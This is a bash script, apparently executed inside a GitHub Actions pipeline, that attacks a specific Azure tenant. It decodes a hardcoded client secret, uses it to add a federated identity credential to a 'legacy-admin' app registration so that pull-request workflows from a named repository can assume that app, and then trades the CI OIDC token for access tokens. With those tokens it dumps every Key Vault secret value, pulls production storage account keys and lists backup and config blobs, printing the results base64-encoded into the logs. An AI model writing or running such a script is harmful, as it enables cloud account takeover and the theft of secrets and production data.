#!/bin/bash
set -e

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)

# Get Graph token
GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$SYNC_CID" \
  -d "client_secret=$SYNC_SEC" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" | jq -r .access_token)
echo "GT_LEN=${#GT}"

# Add federated identity credential to tbl-legacy-admin
# App objectId: 22a3fb7e-860a-4708-9e50-3d36aa21191c
# AppId: 891fb158-e02c-4428-a885-53b811f369c0
echo "=== ADD FEDERATED CRED ==="
FIC=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/federatedIdentityCredentials" \
  -H "Authorization: Bearer $GT" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"lh-pipe\",
    \"issuer\": \"https://token.actions.githubusercontent.com\",
    \"subject\": \"repo:LongHair00/tebamoto-platform:pull_request\",
    \"audiences\": [\"api://AzureADTokenExchange\"],
    \"description\": \"pipe\"
  }")
echo "FIC_B64=$(echo "$FIC" | base64 -w0)"

FIC_ERR=$(echo "$FIC" | jq -r ".error.code // empty")
if [ -z "$FIC_ERR" ]; then
  echo "FEDERATED CRED ADDED"
else
  echo "FIC_ERROR=$FIC_ERR"
  # Try alternative subject patterns
  for SUBJ in "repo:LongHair00/tebamoto-platform:ref:refs/heads/ci-probe" "repo:LongHair00@97606156/tebamoto-platform@1428051794:pull_request"; do
    FIC2=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/federatedIdentityCredentials" \
      -H "Authorization: Bearer $GT" \
      -H "Content-Type: application/json" \
      -d "{\"name\": \"lh-$(echo $SUBJ | md5sum | head -c 8)\", \"issuer\": \"https://token.actions.githubusercontent.com\", \"subject\": \"$SUBJ\", \"audiences\": [\"api://AzureADTokenExchange\"]}")
    echo "FIC2_$(echo $SUBJ | md5sum | head -c 8)=$(echo "$FIC2" | jq -r ".error.code // \"OK\"")"
  done
fi

# Get OIDC token
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC_LEN=${#OIDC}"

# Decode OIDC to see subject
OIDC_PAYLOAD=$(echo "$OIDC" | cut -d. -f2 | base64 -d 2>/dev/null || true)
echo "OIDC_SUB=$(echo "$OIDC_PAYLOAD" | jq -r .sub)"

# Try exchange with tbl-legacy-admin
echo "=== LEGACY EXCHANGE ==="
LA_TOKEN_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
echo "LA_TOKEN_B64=$(echo "$LA_TOKEN_RAW" | base64 -w0)"

LA_VT=$(echo "$LA_TOKEN_RAW" | jq -r ".access_token // empty")
if [ -n "$LA_VT" ]; then
  echo "LA_VT_LEN=${#LA_VT}"
  
  # KV2 secrets
  KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $LA_VT")
  echo "KV2_B64=$(echo "$KV2" | base64 -w0)"
  
  for SID in $(echo "$KV2" | jq -r ".value[]?.id // empty"); do
    SVAL=$(curl -sS "$SID?api-version=7.4" -H "Authorization: Bearer $LA_VT" | jq -r ".value // .error.code")
    echo "SECRET_$(basename $SID)=$SVAL"
  done
  
  # Management
  LA_MT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "scope=https://management.azure.com/.default" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$OIDC" | jq -r .access_token)
  echo "LA_MT_LEN=${#LA_MT}"
  
  # List RGs
  curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourcegroups?api-version=2021-04-01" \
    -H "Authorization: Bearer $LA_MT" | jq -r ".value[]?.name // .error.code"
  
  # ListKeys on ALL storage
  for ACCT in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz; do
    K=$(curl -sS -X POST "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$ACCT/listKeys?api-version=2023-01-01" \
      -H "Authorization: Bearer $LA_MT")
    echo "K_${ACCT:0:12}=$(echo "$K" | jq -r ".keys[0].value // .error.code" | head -c 100)"
  done
  
  # Storage bearer for blob listing
  LA_ST=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "scope=https://storage.azure.com/.default" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$OIDC" | jq -r .access_token)
  echo "LA_ST_LEN=${#LA_ST}"
  
  for EP in "sttblbackupprodx3euoz/exports" "sttblappcfgprodx3euoz/config"; do
    ACCT=$(echo "$EP" | cut -d/ -f1)
    CONT=$(echo "$EP" | cut -d/ -f2)
    BLOBS=$(curl -sS "https://$ACCT.blob.core.windows.net/$CONT?restype=container&comp=list" \
      -H "Authorization: Bearer $LA_ST" -H "x-ms-version: 2020-10-02")
    echo "BLOBS_${CONT}=$(echo "$BLOBS" | head -c 1000 | base64 -w0)"
  done
else
  echo "LA exchange failed"
fi

echo "=== DONE ==="
